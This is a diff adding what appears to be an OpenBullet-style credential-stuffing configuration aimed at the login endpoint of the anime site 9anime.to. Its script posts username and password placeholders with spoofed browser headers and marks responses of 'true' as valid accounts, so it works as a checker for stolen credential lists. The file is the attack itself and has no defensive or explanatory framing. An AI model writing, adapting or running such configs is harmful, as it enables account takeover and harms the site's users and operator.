@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "xvcbgbcvbfvcx",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-02T17:36:39.7187558+02:00",
+  "AdditionalInfo": "",
+  "Author": "fdggdffgd",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www2.9anime.to/user/ajax/login?ts=1554217200&_=776" 
+  CONTENT "username=<USER>&password=<PASS>&remember=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://www2.9anime.to" 
+  HEADER "referer: https://www2.9anime.to/" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authority: www2.9anime.to" 
+  HEADER "method: POST" 
+  HEADER "path: /user/ajax/login?ts=1554217200&_=776" 
+  HEADER "scheme: https" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "true" 
+  KEYCHAIN Failure OR 
+    KEY "false" 
